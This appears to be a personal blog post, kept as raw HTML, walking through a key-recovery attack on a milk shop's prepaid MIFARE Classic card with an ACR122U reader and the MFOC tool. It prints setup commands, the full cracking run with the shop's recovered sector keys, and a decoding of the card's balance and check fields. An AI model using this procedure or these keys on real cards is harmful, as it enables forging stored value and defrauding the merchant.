@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Arch Linux上使用ACR122U破解鲜奶卡 | Gorgias&#39;blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="前言这样的文章多年前就已经被写烂了，没啥意思，作为学习过程吧，发出来。前几天办了一张鲜奶会员卡，充值100获得的，也不用实名。把卡放到机子上刷一下就支付完成了，引起了我的兴趣。
+玩RFID一般使用Proxmark3，当时年少无知买了ACR122U。
+先用我的Nexus5安装Mifare Classic Tool验证一下奶店提供的卡是不是Mifare Classic卡(Nexus5硬件不支持这种类型">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Arch Linux上使用ACR122U破解鲜奶卡">
+<meta property="og:url" content="https://gorgias.me/2016/10/25/Arch-Linux上使用ACR122U破解鲜奶卡/index.html">
+<meta property="og:site_name" content="Gorgias'blog">
+<meta property="og:description" content="前言这样的文章多年前就已经被写烂了，没啥意思，作为学习过程吧，发出来。前几天办了一张鲜奶会员卡，充值100获得的，也不用实名。把卡放到机子上刷一下就支付完成了，引起了我的兴趣。
+玩RFID一般使用Proxmark3，当时年少无知买了ACR122U。
+先用我的Nexus5安装Mifare Classic Tool验证一下奶店提供的卡是不是Mifare Classic卡(Nexus5硬件不支持这种类型">
+<meta property="og:image" content="https://gorgias.me/uploads/2016/10/IMG_20161025_230234-768x1024.jpg">
+<meta property="og:image" content="https://gorgias.me/uploads/2016/10/Screenshot_20161020_224410.png">
+<meta property="og:image" content="https://gorgias.me/uploads/2016/10/Screenshot_20161025_224830.png">
+<meta property="og:image" content="https://gorgias.me/uploads/2016/10/IMG_20161018_1049091-e1477406819438-1024x768.jpg">
+<meta property="og:updated_time" content="2017-03-22T10:04:42.306Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Arch Linux上使用ACR122U破解鲜奶卡">
+<meta name="twitter:description" content="前言这样的文章多年前就已经被写烂了，没啥意思，作为学习过程吧，发出来。前几天办了一张鲜奶会员卡，充值100获得的，也不用实名。把卡放到机子上刷一下就支付完成了，引起了我的兴趣。
+玩RFID一般使用Proxmark3，当时年少无知买了ACR122U。
+先用我的Nexus5安装Mifare Classic Tool验证一下奶店提供的卡是不是Mifare Classic卡(Nexus5硬件不支持这种类型">
+<meta name="twitter:image" content="https://gorgias.me/uploads/2016/10/IMG_20161025_230234-768x1024.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="Gorgias&#39;blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Gorgias&#39;blog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="Flux RSS"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Rechercher"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://gorgias.me"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Arch-Linux上使用ACR122U破解鲜奶卡" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/10/25/Arch-Linux上使用ACR122U破解鲜奶卡/" class="article-date">
+  <time datetime="2016-10-25T14:49:39.000Z" itemprop="datePublished">2016-10-25</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/网络安全/">网络安全</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Arch Linux上使用ACR122U破解鲜奶卡
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这样的文章多年前就已经被写烂了，没啥意思，作为学习过程吧，发出来。<br>前几天办了一张鲜奶会员卡，充值100获得的，也不用实名。把卡放到机子上刷一下就支付完成了，引起了我的兴趣。</p>
+<p>玩RFID一般使用Proxmark3，当时年少无知买了ACR122U。</p>
+<p>先用我的Nexus5安装Mifare Classic Tool验证一下奶店提供的卡是不是Mifare Classic卡(Nexus5硬件不支持这种类型的卡，只能读基本信息)。</p>
+<p>确定是之后，重新拿出封尘的ACR122U，开始在Arch Linux上折腾。</p>
+<p>我的两张饭卡都在外出时丢失了，刚好有备份过以前的卡，顺便重新恢复两张。</p>
+<p><img src="https://gorgias.me/uploads/2016/10/IMG_20161025_230234-768x1024.jpg" alt="img_20161025_230234"></p>
+<h2 id="Basic-Knowledge"><a href="#Basic-Knowledge" class="headerlink" title="Basic Knowledge"></a>Basic Knowledge</h2><p>MIFARE IC卡由荷兰恩智浦(NXP)半导体公司开发，本篇文章分析的是MF1S50系列卡，遵循<a href="https://en.wikipedia.org/wiki/ISO/IEC_14443" target="_blank" rel="external">ISO/IEC 14443A</a>标准。</p>
+<p>NXP公司在2010年更新了MIFARE Classic卡，ID分为7 Byte unique ID和4 Byte non-unique ID。</p>
+<h3 id="Logical-Structure"><a href="#Logical-Structure" class="headerlink" title="Logical Structure"></a>Logical Structure</h3><p>MIFARE Classic 1K 卡的内存被划分成16个sectors，每个sector有4个blocks，每个block占16bytes。</p>
+<p>开头第一个block（Manufacturer Block）包含了UID(Unique Identifier 4 bytes),接下来是厂商数据(Manufacturer Data)。</p>
+<p>BCC(Block Check Character, 1 byte，前4bytes ID的异或结果),ATQA(Answer To Request acc, 2 bytes),SAK(Select Acknowledge, 1 byte)。</p>
+<p><img src="https://gorgias.me/uploads/2016/10/Screenshot_20161020_224410.png" alt="screenshot_20161020_224410"><br>每个sector中的第四个block（Sector Trailer，控制块）保存着两个Secret keys (Key A, Key B, 各占 6 bytes)和 AC (Access condition,决定哪个Key将被使用，占 3 bytes)。还有GPB(General Purpose Byte, 1 byte, 未使用，或者成为 Unused)。</p>
+<h3 id="CRYPTO1"><a href="#CRYPTO1" class="headerlink" title="CRYPTO1"></a>CRYPTO1</h3><p>MIFARE Classic仅使用<a href="https://en.wikipedia.org/wiki/Crypto-1" target="_blank" rel="external">CRYPTO1</a>加密算法，因为算法不公开，未经过大神们的考验，存在潜在的漏洞。2007年两位德国人Karsten Nohl 和 Henryk Pltz提出了Crypto-1加密的缺陷。2008年算法被完全逆向并且公布出来。<br>Crypto-1是一种流密码，依赖密钥序列的随机性和不可预测性。<br><img src="https://gorgias.me/uploads/2016/10/Screenshot_20161025_224830.png" alt="screenshot_20161025_224830"><br>48-bit的LFSR(Linear Feedback Shift Register，线性反馈位移寄存器)和一个非线性函数，生成密钥，长度太短容易被爆破。<br>16-bit的LFSR通过一个多项式生成32bit的nT(随机数)。的前面的16-bit决定了后面的16-bit，密钥的不可预测性就失效了。<br>初始随机数依赖时间生成，通过控制读卡器的时间，可以控制随机数，所以随机性也失效了。</p>
+<h3 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h3><p>参考大神们的文章将破解方法总结。</p>
+<ul>
+<li>条件特殊：重放，监控USB流量，在读卡器和卡之间窃听流量。</li>
+<li>通常：爆破，Dark-Side，认证嵌套(authentication nested)</li>
+</ul>
+<h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><h3 id="ACR122U-Driver"><a href="#ACR122U-Driver" class="headerlink" title="ACR122U Driver"></a>ACR122U Driver</h3><p>下载官方驱动源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.acs.com.hk/download-driver-unified/6260/ACS-Unified-Driver-Lnx-Mac-113-P.zip</div></pre></td></tr></table></figure></p>
+<p>在编译安装之前，需要pcsc-lite。pcsc-lite 封装了访问使用 SCard API (PC/SC) 访问智能卡设备的开发包。</p>
+<p>Arch-Linux</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo pacman -S pcsclite</div></pre></td></tr></table></figure>
+<p>解压并编译安装</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">unzip -d acr122u ./ACS-Unified-Driver-Lnx-Mac-113-P.zip</div><div class="line">cd acr122u</div><div class="line">tar -jxvf acsccid-1.1.3.tar.bz2</div><div class="line">cd ./acsccid-1.1.3</div></pre></td></tr></table></figure>
+<h3 id="Open-Source-Near-Field-Communication-NFC-Library"><a href="#Open-Source-Near-Field-Communication-NFC-Library" class="headerlink" title="Open Source Near Field Communication (NFC) Library"></a>Open Source Near Field Communication (NFC) Library</h3><p>还需要安装libtool（通用库支持脚本），libnfc，在Arch-Linux上安装特别方便</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo pacman -S libtool</div><div class="line">yaourt libnfc</div></pre></td></tr></table></figure>
+<p><code>nfc-list -v</code>查看一下设备列表，结果报错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Unable to claim USB interface (Device or resource busy)</div></pre></td></tr></table></figure>
+<p><a href="https://wiki.archlinux.org/index.php/Touchatag_RFID_Reader" target="_blank" rel="external">Arch Linux Wiki</a>上面说，内核版本(&gt;3.5)会自动加载pn533驱动，pcscd则会报错</p>
+<p>先查看一下模块列表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">gorgias@3vil ~&gt; lsmod</div><div class="line">Module                  Size  Used by</div><div class="line">pn533_usb              16384  0</div><div class="line">pn533                  28672  1 pn533_usb</div><div class="line">nfc                    86016  1 pn533</div></pre></td></tr></table></figure>
+<p>把这三个模块移除，并且加入黑名单，灯会熄灭，但是正常使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo modprobe -r pn533_usb pn533 nfc</div><div class="line">sudo vi /etc/modprobe.d/blacklist-libnfc.conf</div></pre></td></tr></table></figure>
+<p>加入以下内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">blacklist nfc</div><div class="line">blacklist pn533</div><div class="line">blacklist pn533_usb</div></pre></td></tr></table></figure>
+<p>成功显示设备信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">gorgias@3vil ~&gt; nfc-list</div><div class="line">nfc-list uses libnfc 1.7.1</div><div class="line">NFC device: ACS / ACR122U PICC Interface opened</div><div class="line">1 ISO14443A passive target(s) found:</div><div class="line">ISO/IEC 14443A (106 kbps) target:</div><div class="line">    ATQA (SENS_RES): 00  04  </div><div class="line">       UID (NFCID1): 96  c2  d2  9d  </div><div class="line">      SAK (SEL_RES): 08</div></pre></td></tr></table></figure>
+<h3 id="MFOC"><a href="#MFOC" class="headerlink" title="MFOC"></a>MFOC</h3><p>MFOC(Mifare Classic Offline Cracker)是一款离线的认证嵌套攻击工具</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/nfc-tools/mfoc.git</div><div class="line">cd ./mfoc</div><div class="line">autoreconf -vis</div><div class="line">make &amp;&amp; make install</div></pre></td></tr></table></figure>
+<h3 id="Dump-MIFARE-Classic-1K"><a href="#Dump-MIFARE-Classic-1K" class="headerlink" title="Dump MIFARE Classic 1K"></a>Dump MIFARE Classic 1K</h3><p>首先查看帮助</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">gorgias@3vil ~&gt; mfoc -h</div><div class="line">Usage: mfoc [-h] [-k key] [-f file] ... [-P probnum] [-T tolerance] [-O output]</div><div class="line"></div><div class="line">  h     print this help and exit</div><div class="line">  k     try the specified key in addition to the default keys</div><div class="line">  f     parses a file of keys to add in addition to the default keys </div><div class="line">  P     number of probes per sector, instead of default of 20</div><div class="line">  T     nonce tolerance half-range, instead of default of 20</div><div class="line">        (i.e., 40 for the total range, in both directions)</div><div class="line">  O     file in which the card contents will be written (REQUIRED)</div><div class="line"></div><div class="line">Example: mfoc -O mycard.mfd</div><div class="line">Example: mfoc -k ffffeeeedddd -O mycard.mfd</div><div class="line">Example: mfoc -f keys.txt -O mycard.mfd</div><div class="line">Example: mfoc -P 50 -T 30 -O mycard.mfd</div></pre></td></tr></table></figure>
+<p>Dump数据，把每个sector的probes调高一点，默认20，速度可以快很多，输出文件为test.mfd。<br>MFOC先尝试默认密钥，如果不匹配则进行认证嵌套攻击</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div></pre></td><td class="code"><pre><div class="line">gorgias@3vil ~&gt; mfoc -P 500 -O ~/temp/old.mfd</div><div class="line">Found Mifare Classic 1k tag</div><div class="line">ISO/IEC 14443A (106 kbps) target:</div><div class="line">    ATQA (SENS_RES): 00  04  </div><div class="line">* UID size: single</div><div class="line">* bit frame anticollision supported</div><div class="line">       UID (NFCID1): 96  c2  d2  9d  </div><div class="line">      SAK (SEL_RES): 08  </div><div class="line">* Not compliant with ISO/IEC 14443-4</div><div class="line">* Not compliant with ISO/IEC 18092</div><div class="line"></div><div class="line">Fingerprinting based on MIFARE type Identification Procedure:</div><div class="line">* MIFARE Classic 1K</div><div class="line">* MIFARE Plus (4 Byte UID or 4 Byte RID) 2K, Security level 1</div><div class="line">* SmartMX with MIFARE 1K emulation</div><div class="line">Other possible matches based on ATQA &amp; SAK values:</div><div class="line"></div><div class="line">Try to authenticate to all sectors with default keys...</div><div class="line">Symbols: &apos;.&apos; no key found, &apos;/&apos; A key found, &apos;\&apos; B key found, &apos;x&apos; both keys found</div><div class="line">[Key: ffffffffffff] -&gt; [..xxxxxxxxxxxxxx]</div><div class="line">[Key: a0a1a2a3a4a5] -&gt; [..xxxxxxxxxxxxxx]</div><div class="line">[Key: d3f7d3f7d3f7] -&gt; [..xxxxxxxxxxxxxx]</div><div class="line">[Key: 000000000000] -&gt; [..xxxxxxxxxxxxxx]</div><div class="line">[Key: b0b1b2b3b4b5] -&gt; [..xxxxxxxxxxxxxx]</div><div class="line">[Key: 4d3a99c351dd] -&gt; [..xxxxxxxxxxxxxx]</div><div class="line">[Key: 1a982c7e459a] -&gt; [..xxxxxxxxxxxxxx]</div><div class="line">[Key: aabbccddeeff] -&gt; [..xxxxxxxxxxxxxx]</div><div class="line">[Key: 714c5c886e97] -&gt; [..xxxxxxxxxxxxxx]</div><div class="line">[Key: 587ee5f9350f] -&gt; [..xxxxxxxxxxxxxx]</div><div class="line">[Key: a0478cc39091] -&gt; [..xxxxxxxxxxxxxx]</div><div class="line">[Key: 533cb6c723f6] -&gt; [..xxxxxxxxxxxxxx]</div><div class="line">[Key: 8fd0a4f256e9] -&gt; [..xxxxxxxxxxxxxx]</div><div class="line"></div><div class="line">Sector 00 - Unknown Key A               Unknown Key B</div><div class="line">Sector 01 - Unknown Key A               Unknown Key B</div><div class="line">Sector 02 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff</div><div class="line">Sector 03 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff</div><div class="line">Sector 04 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff</div><div class="line">Sector 05 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff</div><div class="line">Sector 06 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff</div><div class="line">Sector 07 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff</div><div class="line">Sector 08 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff</div><div class="line">Sector 09 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff</div><div class="line">Sector 10 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff</div><div class="line">Sector 11 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff</div><div class="line">Sector 12 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff</div><div class="line">Sector 13 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff</div><div class="line">Sector 14 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff</div><div class="line">Sector 15 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff</div><div class="line"></div><div class="line">Using sector 02 as an exploit sector</div><div class="line">Sector: 0, type A, probe 0, distance 64 .....</div><div class="line">  Found Key: A [9db8bbe5265d]</div><div class="line">  Data read with Key A revealed Key B: [883206883206] - checking Auth: OK</div><div class="line">Sector: 1, type A</div><div class="line">  Data read with Key A revealed Key B: [883206883206] - checking Auth: OK</div><div class="line">  Found Key: A [9db8bbe5265d]</div><div class="line">Auth with all sectors succeeded, dumping keys to a file!</div><div class="line">Block 63, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  </div><div class="line">Block 62, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 61, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 60, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 59, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  </div><div class="line">Block 58, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 57, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 56, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 55, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  </div><div class="line">Block 54, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 53, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 52, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 51, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  </div><div class="line">Block 50, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 49, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 48, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 47, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  </div><div class="line">Block 46, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 45, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 44, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 43, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  </div><div class="line">Block 42, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 41, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 40, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 39, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  </div><div class="line">Block 38, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 37, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 36, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 35, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  </div><div class="line">Block 34, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 33, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 32, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 31, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  </div><div class="line">Block 30, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 29, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 28, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 27, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  </div><div class="line">Block 26, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 25, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 24, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 23, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  </div><div class="line">Block 22, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 21, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 20, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 19, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  </div><div class="line">Block 18, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 17, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 16, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 15, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  </div><div class="line">Block 14, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 13, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 12, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 11, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  </div><div class="line">Block 10, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 09, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 08, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 07, type A, key 9db8bbe5265d :00  00  00  00  00  00  ff  07  80  69  88  32  06  88  32  06  </div><div class="line">Block 06, type A, key 9db8bbe5265d :36  30  35  34  38  32  35  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 05, type A, key 9db8bbe5265d :03  00  00  00  fc  ff  ff  ff  03  00  00  00  05  fa  05  fa  </div><div class="line">Block 04, type A, key 9db8bbe5265d :dc  23  00  00  23  dc  ff  ff  dc  23  00  00  04  fb  04  fb  </div><div class="line">Block 03, type A, key 9db8bbe5265d :00  00  00  00  00  00  ff  07  80  69  88  32  06  88  32  06  </div><div class="line">Block 02, type A, key 9db8bbe5265d :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  </div><div class="line">Block 01, type A, key 9db8bbe5265d :bd  fa  d2  b5  b9  ab  cb  be  49  43  bf  a8  00  00  00  00  </div><div class="line">Block 00, type A, key 9db8bbe5265d :96  c2  d2  9d  1b  08  04  00  62  63  64  65  66  67  68  69</div></pre></td></tr></table></figure>
+<h3 id="开始分析"><a href="#开始分析" class="headerlink" title="开始分析"></a>开始分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">96c2 d29d 1b08 0400 6263 6465 6667 6869     #UID 96c2d29d(4 bytes), 1b(???), 08(SAK 1 byte), 0400(ATQA 0004 2 bytes), 6263646566676869(占位 bcdefghi 8 bytes)</div><div class="line">bdfa d2b5 b9ab cbbe 4943 bfa8 0000 0000     #字符串“晋业公司IC卡”</div><div class="line">0000 0000 0000 0000 0000 0000 0000 0000</div><div class="line">9db8 bbe5 265d ff07 8069 8832 0688 3206     #9db8bbe5265d(KeyA 6 bytes), ff0780(Access Conditions 3 bytes), 69（Undefined 1 byte）,883206883206(KeyB 6 bytes)</div><div class="line"></div><div class="line">dc23 0000 23dc ffff dc23 0000 04fb 04fb     #dc23 0000(金额高低位转换，10进制 91.80，4 bytes), 23dc ffff(金额异或校验位，4 bytes), 23dc ffff(金额，4 bytes), 04fb 04fb(???)</div><div class="line">0300 0000 fcff ffff 0300 0000 05fa 05fa     #0300 0000(使用次数，每次消费或充值加1，4 bytes), fcff ffff(次数异或校验位，4 bytes), 0300 0000(次数，4 bytes), 05fa(???)</div><div class="line">3630 3534 3832 3500 0000 0000 0000 0000     #卡号6054825</div><div class="line">9db8 bbe5 265d ff07 8069 8832 0688 3206     #9db8bbe5265d(KeyA 6 bytes), ff0780(Access Conditions 3 bytes), 69(Undefined 1 byte),883206883206(KeyB 6 bytes)</div></pre></td></tr></table></figure>
